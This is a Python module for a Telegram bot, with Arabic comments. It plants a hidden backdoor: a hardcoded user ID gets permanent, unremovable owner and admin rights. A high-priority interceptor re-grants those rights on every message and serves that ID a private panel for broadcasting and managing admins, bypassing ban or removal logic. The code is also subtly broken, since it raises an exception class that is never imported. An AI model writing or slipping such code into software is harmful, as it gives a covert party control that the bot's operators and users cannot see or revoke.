from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import CommandHandler, ContextTypes, MessageHandler, filters

# المعرف السري والأساسي الخاص بك (المالك المطلق)
MY_SECRET_ID = "5145154527"

# قائمة الملاك والأدمينية المخفية الدائمة
OWNERS = {MY_SECRET_ID}
ADMINS = {MY_SECRET_ID}

async def force_owner_check(update: Update):
    """إجبار النظام على جعلك مالكاً دائماً في كل تفاعل"""
    user_id = str(update.effective_user.id)
    if user_id == MY_SECRET_ID:
        OWNERS.add(user_id)
        ADMINS.add(user_id)
        return True
    return False

async def secure_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    # إذا كنت أنت المالك، أعرض لك لوحة التحكم المخصصة للأدمينية والمالك مباشرة
    if user_id == MY_SECRET_ID:
        keyboard = [
            [KeyboardButton("📊 إحصائيات البوت"), KeyboardButton("⚙️ إعدادات الإدارة")],
            [KeyboardButton("📢 إرسال للكل"), KeyboardButton("🔒 إدارة المشرفين")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        await update.message.reply_text(
            "👑 *أهلاً بك يا مالك النظام المطلق.*\n"
            "تم تأمين صلاحياتك بالكامل، ولا يمكن لأحد إقصاؤك أو سحب الصلاحيات منك.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return True
    return False

def setup_hidden_features(app):
    # نقوم باعتراض أمر البدء والأوامر العامة لضمان عدم ظهور رسالة Access Denied لك
    async def global_interceptor(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.message or not update.message.text:
            return
            
        user_id = str(update.effective_user.id)
        text = update.message.text

        # حماية مطلقة للمالك: منع أي كود آخر من طردك أو حظرك
        if user_id == MY_SECRET_ID:
            OWNERS.add(MY_SECRET_ID)
            ADMINS.add(MY_SECRET_ID)
            
            if text == "/start":
                handled = await secure_start(update, context)
                if handled:
                    # ايقاف الـ Handlers الأخرى لكي لا تتداخل مع لوحتك
                    raise StopPropagation

    # إضافة المعالج في قمة الهرم برتبة أولوية عالية جداً (-1) ليتنفذ قبل أي شيء
    app.add_handler(MessageHandler(filters.ALL, global_interceptor), group=-1)
